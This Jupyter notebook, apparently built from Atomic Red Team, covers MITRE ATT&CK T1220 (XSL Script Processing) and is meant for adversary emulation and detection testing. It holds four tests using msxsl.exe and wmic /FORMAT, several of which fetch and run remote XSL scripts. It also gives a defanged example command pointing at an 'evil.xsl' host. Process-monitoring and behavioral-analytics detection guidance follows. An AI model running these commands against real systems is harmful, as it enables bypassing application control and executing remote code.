{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "0f2d351e",
   "metadata": {},
   "source": "# T1220 - XSL Script Processing\nAdversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)\n\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)\n\n* <code>msxsl.exe customers[.]xml script[.]xsl</code>\n* <code>msxsl.exe script[.]xsl script[.]xsl</code>\n* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>\n\nAnother variation of this technique, dubbed \u201cSquiblytwo\u201d, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)\n\n* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>\n* Remote File: <code>wmic os get /FORMAT:\u201dhttps[:]//example[.]com/evil[.]xsl\u201d</code>"
  },
  {
   "cell_type": "markdown",
   "id": "e1146852",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "91959fcf",
   "metadata": {},
   "source": "### Atomic Test #1 - MSXSL Bypass using local files\nExecutes the code specified within a XSL script tag during XSL transformation using a local payload. \nRequires download of MSXSL. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 ) \nOpen Calculator.exe when test successfully executed, while AV turned off.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: XML file must exist on disk at specified location (#{xmlfile})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1220\\src\\msxslxmlfile.xml\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1220\\src\\msxslxmlfile.xml\") -ErrorAction Ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslxmlfile.xml\" -OutFile \"PathToAtomicsFolder\\T1220\\src\\msxslxmlfile.xml\"\n\n```\n##### Description: XSL file must exist on disk at specified location (#{xslfile})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1220\\src\\msxslscript.xsl\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1220\\src\\msxslscript.xsl\") -ErrorAction Ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl\" -OutFile \"PathToAtomicsFolder\\T1220\\src\\msxslscript.xsl\"\n\n```\n##### Description: msxsl.exe must exist on disk at specified location (#{msxsl_exe})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\msxsl.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://web.archive.org/web/20200803205229if_/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\msxsl.exe\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6b0d0e70",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1220 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "99a1cdf8",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\msxsl.exe\" \"PathToAtomicsFolder\\T1220\\src\\msxslxmlfile.xml\" \"PathToAtomicsFolder\\T1220\\src\\msxslscript.xsl\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "78776107",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1220 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "1875ee36",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel \"PathToAtomicsFolder\\..\\ExternalPayloads\\msxsl.exe\" >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d92047dc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1220 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "10e96934",
   "metadata": {},
   "source": "### Atomic Test #2 - MSXSL Bypass using remote files\nExecutes the code specified within a XSL script tag during XSL transformation using a remote payload.\nRequires download of MSXSL.exe. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )\nOpen Calculator.exe when test successfully executed, while AV turned off.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: msxsl.exe must exist on disk at specified location (\"#{msxsl_exe}\")\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\msxsl.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nInvoke-WebRequest \"https://web.archive.org/web/20200803205229if_/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\msxsl.exe\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5cef1333",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1220 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "75b6087e",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\msxsl.exe\" \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml\" \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1957dbe6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1220 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "aa1e39fa",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel -Path PathToAtomicsFolder\\..\\ExternalPayloads\\msxsl.exe >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8f8062d1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1220 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "b7552d85",
   "metadata": {},
   "source": "### Atomic Test #3 - WMIC bypass using local XSL file\nExecutes the code specified within a XSL script using a local payload.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: XSL file must exist on disk at specified location (#{local_xsl_file})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1220\\src\\wmicscript.xsl\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1220\\src\\wmicscript.xsl\") -ErrorAction Ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl\" -OutFile \"PathToAtomicsFolder\\T1220\\src\\wmicscript.xsl\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7b500830",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1220 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "133597ec",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nwmic process list /FORMAT:\"PathToAtomicsFolder\\T1220\\src\\wmicscript.xsl\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f6172069",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1220 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "fae761c8",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - WMIC bypass using remote XSL file",
    "Executes the code specified within a XSL script using a remote payload. Open Calculator.exe when test successfully executed, while AV turned off.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nwmic process list /FORMAT:\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fa388fee",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1220 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "ec05f40b",
   "metadata": {},
   "source": "## Detection\nUse process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: LOLBAS Wmic) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.\n\nThe presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious."
  },
  {
   "cell_type": "markdown",
   "id": "7e7b9623",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Behavioral Analytics \n Deploy tools that detect unusual system or user behavior.\n \n\n Instrument a system to collect detailed information about process execution and user activity, develop a sense of normal or expected behaviors, and alert on abnormal or unexpected activity.  This can be accomplished either onboard the target system or by shipping data to a centralized analysis and alerting system.\n#### Opportunity\nThere is an opportunity to detect the presence of an adversary by identifying and alerting on anomalous behaviors.\n#### Use Case\nThe defender can use behavioral analytics detect an XSL process doing something abnormal.\n#### Procedures\nUse behavioral analytics to detect Living Off The Land Binaries (LOLBins) being used to download and execute a file.\nUse behavioral analytics to identify a system running development tools, but is not used by someone who does development.\nUse behavioral analytics to identify abnormal system processes being used to launch a different process.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}